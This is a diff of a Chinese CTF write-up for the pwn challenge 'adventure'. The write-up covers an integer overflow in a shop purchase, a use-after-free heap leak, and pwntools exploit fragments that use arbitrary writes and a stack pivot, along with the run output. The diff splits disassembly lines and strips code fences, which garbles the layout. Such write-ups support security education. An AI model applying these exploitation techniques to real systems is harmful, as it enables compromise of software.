@@ -7,32 +7,58 @@ adventure
 
 题目做了个小游戏，22.04 版本，给了 Dockerfile，因为是C++的程序，所以不急着逆，先运行一下发现可以用一些指令来操作，那么根据字符串来找到操作指令
 
-.rodata:000000000002E5E9                 db '=== Equipment ===',0
-.rodata:000000000002E5FB aBattle_0       db 'battle',0           ; DATA XREF: sub_27796+6C↑o
-.rodata:000000000002E602 aFight          db 'fight',0            ; DATA XREF: sub_27796+93↑o
-.rodata:000000000002E608 aStatus         db 'status',0           ; DATA XREF: sub_27796+BD↑o
-.rodata:000000000002E60F aInventory      db 'inventory',0        ; DATA XREF: sub_27796+123↑o
-.rodata:000000000002E619 aInv            db 'inv',0              ; DATA XREF: sub_27796+156↑o
-.rodata:000000000002E61D aShop_0         db 'shop',0             ; DATA XREF: sub_27796+189↑o
-.rodata:000000000002E622 aStore          db 'store',0            ; DATA XREF: sub_27796+1BC↑o
-.rodata:000000000002E628 aGameStats      db 'game_stats',0       ; DATA XREF: sub_27796+F0↑o
-.rodata:000000000002E628                                         ; sub_27796+1EF↑o
-.rodata:000000000002E633 aStatistics     db 'statistics',0       ; DATA XREF: sub_8C7E+C5↑o
-.rodata:000000000002E633                                         ; sub_2A696+1AB↑o ...
-.rodata:000000000002E63E aMap_0          db 'map',0              ; DATA XREF: sub_27796+255↑o
-.rodata:000000000002E642 aWorld          db 'world',0            ; DATA XREF: sub_27796+288↑o
-.rodata:000000000002E648 aExplore        db 'explore',0          ; DATA XREF: sub_27796+2BB↑o
-.rodata:000000000002E650 aQuests         db 'quests',0           ; DATA XREF: sub_27796+2EE↑o
-.rodata:000000000002E657 aQuest          db 'quest',0            ; DATA XREF: sub_27796+321↑o
-.rodata:000000000002E65D aMissions       db 'missions',0         ; DATA XREF: sub_27796+354↑o
-.rodata:000000000002E666 aUpgrade        db 'upgrade',0          ; DATA XREF: sub_27796+387↑o
-.rodata:000000000002E66E aSkills_0       db 'skills',0           ; DATA XREF: sub_27796+3BA↑o
-.rodata:000000000002E675 aMove           db 'move',0             ; DATA XREF: sub_27796+3ED↑o
-.rodata:000000000002E67A aGo             db 'go',0               ; DATA XREF: sub_27796+420↑o
-.rodata:000000000002E67D aSearch         db 'search',0           ; DATA XREF: sub_27796+51F↑o
-.rodata:000000000002E684 aLook           db 'look',0             ; DATA XREF: sub_27796+585↑o
-.rodata:000000000002E689 aQuit           db 'quit',0             ; DATA XREF: sub_27796+5B8↑o
-.rodata:000000000002E68E aExit           db 'exit',0             ; DATA XREF: sub_27796+5EB↑o
+.rodata:
+000000000002E5E9                 db '=== Equipment ===',0
+.rodata:
+000000000002E5FB aBattle_0       db 'battle',0           ; DATA XREF: sub_27796+6C↑o
+.rodata:
+000000000002E602 aFight          db 'fight',0            ; DATA XREF: sub_27796+93↑o
+.rodata:
+000000000002E608 aStatus         db 'status',0           ; DATA XREF: sub_27796+BD↑o
+.rodata:
+000000000002E60F aInventory      db 'inventory',0        ; DATA XREF: sub_27796+123↑o
+.rodata:
+000000000002E619 aInv            db 'inv',0              ; DATA XREF: sub_27796+156↑o
+.rodata:
+000000000002E61D aShop_0         db 'shop',0             ; DATA XREF: sub_27796+189↑o
+.rodata:
+000000000002E622 aStore          db 'store',0            ; DATA XREF: sub_27796+1BC↑o
+.rodata:
+000000000002E628 aGameStats      db 'game_stats',0       ; DATA XREF: sub_27796+F0↑o
+.rodata:
+000000000002E628                                         ; sub_27796+1EF↑o
+.rodata:
+000000000002E633 aStatistics     db 'statistics',0       ; DATA XREF: sub_8C7E+C5↑o
+.rodata:
+000000000002E633                                         ; sub_2A696+1AB↑o ...
+.rodata:
+000000000002E63E aMap_0          db 'map',0              ; DATA XREF: sub_27796+255↑o
+.rodata:
+000000000002E642 aWorld          db 'world',0            ; DATA XREF: sub_27796+288↑o
+.rodata:
+000000000002E648 aExplore        db 'explore',0          ; DATA XREF: sub_27796+2BB↑o
+.rodata:
+000000000002E650 aQuests         db 'quests',0           ; DATA XREF: sub_27796+2EE↑o
+.rodata:
+000000000002E657 aQuest          db 'quest',0            ; DATA XREF: sub_27796+321↑o
+.rodata:
+000000000002E65D aMissions       db 'missions',0         ; DATA XREF: sub_27796+354↑o
+.rodata:
+000000000002E666 aUpgrade        db 'upgrade',0          ; DATA XREF: sub_27796+387↑o
+.rodata:
+000000000002E66E aSkills_0       db 'skills',0           ; DATA XREF: sub_27796+3BA↑o
+.rodata:
+000000000002E675 aMove           db 'move',0             ; DATA XREF: sub_27796+3ED↑o
+.rodata:
+000000000002E67A aGo             db 'go',0               ; DATA XREF: sub_27796+420↑o
+.rodata:
+000000000002E67D aSearch         db 'search',0           ; DATA XREF: sub_27796+51F↑o
+.rodata:
+000000000002E684 aLook           db 'look',0             ; DATA XREF: sub_27796+585↑o
+.rodata:
+000000000002E689 aQuit           db 'quit',0             ; DATA XREF: sub_27796+5B8↑o
+.rodata:
+000000000002E68E aExit           db 'exit',0             ; DATA XREF: sub_27796+5EB↑o
 
 然后根据提示输入，职业进行了一些限定，设置为 warrior ，探测出来地图，找到最后要打的 boss ，根据经验来看一般是要在商店操作一些金币溢出之类的东西，一番手动测试后发现买炸弹可以触发整数溢出让钱变得很多：
 
@@ -309,37 +335,58 @@ flag{fake_flag}x00x00x00x00x00x00
 
 
 ```
-.rodata:000000000002E5E9                 db '=== Equipment ===',0
-.rodata:000000000002E5FB aBattle_0       db 'battle',0           ; DATA XREF: sub_27796+6C↑o
-.rodata:000000000002E602 aFight          db 'fight',0            ; DATA XREF: sub_27796+93↑o
-.rodata:000000000002E608 aStatus         db 'status',0           ; DATA XREF: sub_27796+BD↑o
-.rodata:000000000002E60F aInventory      db 'inventory',0        ; DATA XREF: sub_27796+123↑o
-.rodata:000000000002E619 aInv            db 'inv',0              ; DATA XREF: sub_27796+156↑o
-.rodata:000000000002E61D aShop_0         db 'shop',0             ; DATA XREF: sub_27796+189↑o
-.rodata:000000000002E622 aStore          db 'store',0            ; DATA XREF: sub_27796+1BC↑o
-.rodata:000000000002E628 aGameStats      db 'game_stats',0       ; DATA XREF: sub_27796+F0↑o
-.rodata:000000000002E628                                         ; sub_27796+1EF↑o
-.rodata:000000000002E633 aStatistics     db 'statistics',0       ; DATA XREF: sub_8C7E+C5↑o
-.rodata:000000000002E633                                         ; sub_2A696+1AB↑o ...
-.rodata:000000000002E63E aMap_0          db 'map',0              ; DATA XREF: sub_27796+255↑o
-.rodata:000000000002E642 aWorld          db 'world',0            ; DATA XREF: sub_27796+288↑o
-.rodata:000000000002E648 aExplore        db 'explore',0          ; DATA XREF: sub_27796+2BB↑o
-.rodata:000000000002E650 aQuests         db 'quests',0           ; DATA XREF: sub_27796+2EE↑o
-.rodata:000000000002E657 aQuest          db 'quest',0            ; DATA XREF: sub_27796+321↑o
-.rodata:000000000002E65D aMissions       db 'missions',0         ; DATA XREF: sub_27796+354↑o
-.rodata:000000000002E666 aUpgrade        db 'upgrade',0          ; DATA XREF: sub_27796+387↑o
-.rodata:000000000002E66E aSkills_0       db 'skills',0           ; DATA XREF: sub_27796+3BA↑o
-.rodata:000000000002E675 aMove           db 'move',0             ; DATA XREF: sub_27796+3ED↑o
-.rodata:000000000002E67A aGo             db 'go',0               ; DATA XREF: sub_27796+420↑o
-.rodata:000000000002E67D aSearch         db 'search',0           ; DATA XREF: sub_27796+51F↑o
-.rodata:000000000002E684 aLook           db 'look',0             ; DATA XREF: sub_27796+585↑o
-.rodata:000000000002E689 aQuit           db 'quit',0             ; DATA XREF: sub_27796+5B8↑o
-.rodata:000000000002E68E aExit           db 'exit',0             ; DATA XREF: sub_27796+5EB↑o
-```
-
-
-
-```
+.rodata:
+000000000002E5E9                 db '=== Equipment ===',0
+.rodata:
+000000000002E5FB aBattle_0       db 'battle',0           ; DATA XREF: sub_27796+6C↑o
+.rodata:
+000000000002E602 aFight          db 'fight',0            ; DATA XREF: sub_27796+93↑o
+.rodata:
+000000000002E608 aStatus         db 'status',0           ; DATA XREF: sub_27796+BD↑o
+.rodata:
+000000000002E60F aInventory      db 'inventory',0        ; DATA XREF: sub_27796+123↑o
+.rodata:
+000000000002E619 aInv            db 'inv',0              ; DATA XREF: sub_27796+156↑o
+.rodata:
+000000000002E61D aShop_0         db 'shop',0             ; DATA XREF: sub_27796+189↑o
+.rodata:
+000000000002E622 aStore          db 'store',0            ; DATA XREF: sub_27796+1BC↑o
+.rodata:
+000000000002E628 aGameStats      db 'game_stats',0       ; DATA XREF: sub_27796+F0↑o
+.rodata:
+000000000002E628                                         ; sub_27796+1EF↑o
+.rodata:
+000000000002E633 aStatistics     db 'statistics',0       ; DATA XREF: sub_8C7E+C5↑o
+.rodata:
+000000000002E633                                         ; sub_2A696+1AB↑o ...
+.rodata:
+000000000002E63E aMap_0          db 'map',0              ; DATA XREF: sub_27796+255↑o
+.rodata:
+000000000002E642 aWorld          db 'world',0            ; DATA XREF: sub_27796+288↑o
+.rodata:
+000000000002E648 aExplore        db 'explore',0          ; DATA XREF: sub_27796+2BB↑o
+.rodata:
+000000000002E650 aQuests         db 'quests',0           ; DATA XREF: sub_27796+2EE↑o
+.rodata:
+000000000002E657 aQuest          db 'quest',0            ; DATA XREF: sub_27796+321↑o
+.rodata:
+000000000002E65D aMissions       db 'missions',0         ; DATA XREF: sub_27796+354↑o
+.rodata:
+000000000002E666 aUpgrade        db 'upgrade',0          ; DATA XREF: sub_27796+387↑o
+.rodata:
+000000000002E66E aSkills_0       db 'skills',0           ; DATA XREF: sub_27796+3BA↑o
+.rodata:
+000000000002E675 aMove           db 'move',0             ; DATA XREF: sub_27796+3ED↑o
+.rodata:
+000000000002E67A aGo             db 'go',0               ; DATA XREF: sub_27796+420↑o
+.rodata:
+000000000002E67D aSearch         db 'search',0           ; DATA XREF: sub_27796+51F↑o
+.rodata:
+000000000002E684 aLook           db 'look',0             ; DATA XREF: sub_27796+585↑o
+.rodata:
+000000000002E689 aQuit           db 'quit',0             ; DATA XREF: sub_27796+5B8↑o
+.rodata:
+000000000002E68E aExit           db 'exit',0             ; DATA XREF: sub_27796+5EB↑o
 --- Actions ---
 12. Buy Items
 13. Sell Items
@@ -352,11 +399,6 @@ How many? (1-8500600): 8500600
 Warrior purchased 8500600 Bomb for -2118813696 gold!
 
 Press Enter to continue...
-```
-
-
-
-```
 Bomb has been consumed and removed from inventory.
 Bomb used 8500600 time(s) successfully!
 
@@ -386,11 +428,6 @@ Paralysis Ring equipped successfully!
 ✨ The Paralysis Ring is now equipped and its power flows through you!
 Returning to command mode.
 >
-```
-
-
-
-```
 gef> tcachebins
 ...
 tcachebins[idx=4, size=0x60, @0x55928697f0b0]: fd=0x559286997ca0 count=3
@@ -408,11 +445,6 @@ tcachebins[idx=4, size=0x60, @0x55928697f0b0]: fd=0x559286997ca0 count=3
       0x5592869976f8|+0x0030|+006: 0x0000000000000000
       0x559286997700|+0x0038|+007: 0x0000000000000000
       0x559286997708|+0x0040|+008: 0x0000559286997860  ->  0x00005597dfb11337    # freed
-```
-
-
-
-```
 buy_item(1)
 buy_item(2)
 buy_item(3)
@@ -421,11 +453,6 @@ use_item(5)
 # 此时麻痹戒指之前的堆块被释放，麻痹戒指的描述指向了一个释放后的 tcache 堆块
 heap_addr = (edit_ring(b'a') << 12) - 0x19000
 success(f"heap_addr: {hex(heap_addr)}")
-```
-
-
-
-```
 from pwn import *
 lib_std_cpp = ELF("./libstdc++.so.6.0.30")
 libc = ELF("./libc.so.6")
@@ -581,11 +608,6 @@ aaw(wide_data_addr, p64(pop_rsp))
 aaw(wide_data_addr + 0x8, p64(heap_addr + 0x3808))
 
 p.interactive()
-```
-
-
-
-```
 (base) ➜  bin python solve.py                                                                                                                                                    
 [*] '/mnt/d/ctf/25qwb/pwn/adventure/adventure/bin/libstdc++.so.6.0.30'
     Arch:       amd64-64-little
